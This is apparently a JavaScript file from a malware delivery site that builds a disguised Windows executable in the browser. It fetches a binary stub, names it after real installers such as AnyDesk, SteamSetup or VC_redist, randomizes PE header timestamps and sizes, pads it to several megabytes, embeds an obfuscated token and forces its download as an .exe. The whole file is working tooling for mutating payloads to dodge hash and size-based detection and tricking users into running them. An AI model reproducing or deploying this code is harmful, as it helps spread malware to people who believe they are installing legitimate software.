function rnn() {
    switch (Math.floor((Math.random() * 6))) {
        case 1:
            return "AnyDesk";
        case 2:
            return "SteamSetup";
        case 3:
            return "TechnicLauncher";
        case 4:
            return "VC_redist.x64";
        case 5:
            return "setup-lightshot";
        case 6:
            return "parsec-windows";
        default:
            return "setup";
    }

}

function rss() {
    return (6500 + Math.floor((Math.random() * 2500)));
}

function buf2hex(buffer) { 
  return [...new Uint8Array(buffer)]
      .map(x => x.toString(16).padStart(2, '0'))
      .join('');
}

var tok = "";

document.getElementById("dl_filename").value = rnn();
document.getElementById("dl_size").value = rss();
document.getElementById("dl_size").oninput();

tok = btoa(document.getElementById("acid").attributes.reqhash.value.split("").reverse().join("")).split("").reverse().join("");
document.getElementById("acid").removeAttribute("reqhash");

function dlv(magich, mnum) {

    try {
        document.getElementById("downloader_modal").style.display = 'block';

        var opt = (Math.random() * 20);
        var scsrc = "./files/v";

        if (opt < 10) {
            scsrc += "1";
        } else {
            scsrc += "1";
        }

        function magic() {

            var arrayBuffer = oReq.response;
            var vFile = "";

            if (arrayBuffer) {
              vFile = new Uint8Array(arrayBuffer);
              vFile = buf2hex(vFile);
            } else {
                return;
            }

            var re = '';
            var ch = atob(magich);
            var cl = ch.length;

            function htb64(hexstring) {
                return btoa(hexstring.match(/\w{2}/g).map(function (a) {
                    return String.fromCharCode(parseInt(a, 16));
                }).join(""));
            }

            function cs() {
                var dls = document.getElementById("dl_size").value * 1000 * mnum;
                var objsize = (dls - (vFile.length / mnum));
                re = vFile;
                for (var i = 0; i < objsize; i++) {
                    re += ch.charAt(Math.floor(Math.random() * cl));
                }
                return htb64(re.substring(0, dls));
            }


            String.prototype.replaceAt = function (index, replacement) {
                return this.substring(0, index) + replacement + this.substring(index + replacement.length);
            }

            function rintbyte(mm, mx) {
                const res = [];
                var rts = (Math.floor(Math.random() * (mx - mm)) + mm).toString(16);
                let le = rts.length - mnum;
                while (le >= 0) {
                    res.push(rts.substr(le, mnum));
                    le -= mnum;
                }
                return res.join('');
            }

            function rbyte(pp, tx) {
                for (let x = 0; x < tx.length; x++) {
                    vFile = vFile.replaceAt(pp + x, tx.charAt(x));
                }
            }
            
            vFile += "0000000000000000";

            let pe_rel_addr = vFile.indexOf("504500")

            rbyte(pe_rel_addr + (8 * mnum), rintbyte(1514768461, 1640998861));
            rbyte(pe_rel_addr + (28 * mnum), rintbyte(8500000, 10000000));
            rbyte(pe_rel_addr + (32 * mnum), rintbyte(700000, 1000000));

            if (document.getElementById("dl_cb1").checked) {
                var opt = (Math.random() * 40);
                var bytepos = 32;
                if (opt < 10) {
                    bytepos = 48;
                } else if (opt < 20) {
                    bytepos = 34;
                } else if (opt < 30) {
                    bytepos = 44;
                }
                
                rbyte((bytepos * mnum), ((Math.random() * 20) < 10) ? "40" : "80");
            }

            for (var x = 0; x < 258; x++) {
                vFile += ch.charAt(Math.floor(Math.random() * cl));
            }

            vFile += "2E4800BE";

            tok = atob(tok.split("").reverse().join("")).split("").reverse().join("");

            tok = tok.replace(/[^a-z0-9]/gi, '');
            tok = tok.substring(0, 24);
            tok = tok.replace(/[^a-z0-9]/gi, '');

            for (var x = 0; x < 734; x++) {
                vFile += ch.charAt(Math.floor(Math.random() * cl));
            }

            for (var x = 0; x < tok.length; x++) {
                vFile += (tok.charCodeAt(x) + 80).toString(16);
            }

            vFile += "4800";

            tok = btoa(tok.split("").reverse().join("")).split("").reverse().join("");

            var el = document.createElement('a');
            el.style.display = 'none';
            el.setAttribute('href', 'data:application/octet-stream;base64,' + cs());
            el.setAttribute('download', document.getElementById("dl_filename").value + ".exe");
            document.body.appendChild(el);
            el.click();
            document.body.removeChild(el);

            pe_rel_addr = null;
            scsrc = null;
            ch = null;
            opt = 0;

            random_int_byte = {};
            random_name = {};
            random_bytes = {};
            htb64 = {};

        }

        var oReq = new XMLHttpRequest();
        oReq.open("GET", scsrc + ".bin", true);
        oReq.responseType = "arraybuffer";

        oReq.onload = function (oEvent) {
            magic();
            document.getElementById("downloader_modal").style.display = 'none';
        };

        oReq.send(null);
    } catch {
        document.getElementById("downloader_modal").style.display = 'none';
        alert("error while building your download");
    }
}